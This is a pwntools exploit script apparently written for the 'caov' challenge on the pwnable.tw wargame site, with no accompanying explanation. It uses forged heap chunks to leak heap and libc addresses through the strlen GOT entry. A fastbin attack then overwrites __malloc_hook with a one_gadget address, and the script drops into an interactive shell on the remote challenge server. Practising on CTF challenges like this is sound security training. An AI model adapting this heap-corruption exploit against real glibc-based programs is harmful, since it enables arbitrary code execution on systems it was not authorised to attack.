from pwn import *
import sys

libc = ELF("libc_64.so.6")
elf = ELF("caov")
if sys.argv[1] == "l":
    p = process("./caov_patched", env={"LD_PRELOAD":"libc_64.so.6"})
    context.terminal = ["tmux", "splitw", "-h"]
    gdb.attach(p,""" 
                b *0x4014F5
                continue
                """)
elif sys.argv[1] == "r":
    p = remote("chall.pwnable.tw", 10306)

def show():
    p.sendlineafter("Your choice: ", "1")

def edit(name, length, key, value):
    p.sendlineafter("Your choice: ", "2")
    p.sendafter("name: ", name)
    p.sendlineafter("length: ", str(length))
    if length > 1000:
        return
    p.sendlineafter("Key: ", key)
    p.sendlineafter("Value: ", str(value))

def solve():
    one_gadgets = [0x45216, 0x4526a, 0xef6c4, 0xf0567]
    p.sendafter("name: ",  "\n")
    p.sendlineafter("key: ", "\x00"*40)  # this will go to fastbin [0x30]
    p.sendlineafter("value: ", str(1))

    # put 0x6032d0 to fastbin 0x20 => when calling edit_data(), D->key = 0x6032d0
    edit(p64(0) + p64(0x20) + "A"*16 + p64(0) + p64(0x20) + "A"*16*3 + p64(0x6032d0) + "\n", 20, "A"*20, 1)
    
    edit(p64(0) + p64(0x41) + p64(0)*6 + p64(0) + p64(0x20) + "A"*16 + p64(0x6032d0) + "\n", 1001, "", 1)
    p.recvuntil("Your data info after editing:")
    heap_base = u32(p.recv(14)[6:10]) - 0x11c90
    success("got strlen: %s"%hex(elf.got["strlen"]))
    success("heap base: %s"%hex(heap_base))


    # leak libc
    edit(p64(0) + p64(0x51) + p64(0)*8 + p64(0) + p64(0x21) + p64(heap_base+ 0x11ce0) + "\n", 50, p64(elf.got["strlen"]) + p64(0)*3, 1)
    p.recvuntil("Your data info after editing:")
    libc.address = u64(p.recv(20)[6:12] + "\x00\x00")  - 0x8ab70
    system = libc.symbols["system"]
    one_gadget = libc.address + one_gadgets[2]
    malloc_hook = libc.symbols["__malloc_hook"]
    success("libc address: %s"%hex(libc.address))
    success("malloc_hook: %s"%hex(malloc_hook))
    success("one_gadget: %s"%hex(one_gadget))
    # fastbin attack => overwrite malloc_hook with one_gadget
    # edit("A"*96 + p64(malloc_hook-0x13) + "\n", 0x60, "Z"*8, 1)
    edit(p64(0) + p64(0x71) + p64(0)*10 + p64(0x6032d0) + p64(0) + p64(0) + p64(0x20) + "\n", 1001, "", 1)
    edit(p64(0) + p64(0x71) + p64(malloc_hook-0x23) + p64(0)*2 + p64(0x20) + "\n", 0x60, "A"*0x10, 1)
    edit(p64(0) + p64(0x51) + p64(0) + "\n", 0x60, "\x00"*0x13 + p64(one_gadget), 1)
    # edit(p64(0) + p64(0x51) + p64(0) + "\n", 0x60, "Z"*0x30, 1)

    p.interactive()

if __name__ == "__main__":
    solve()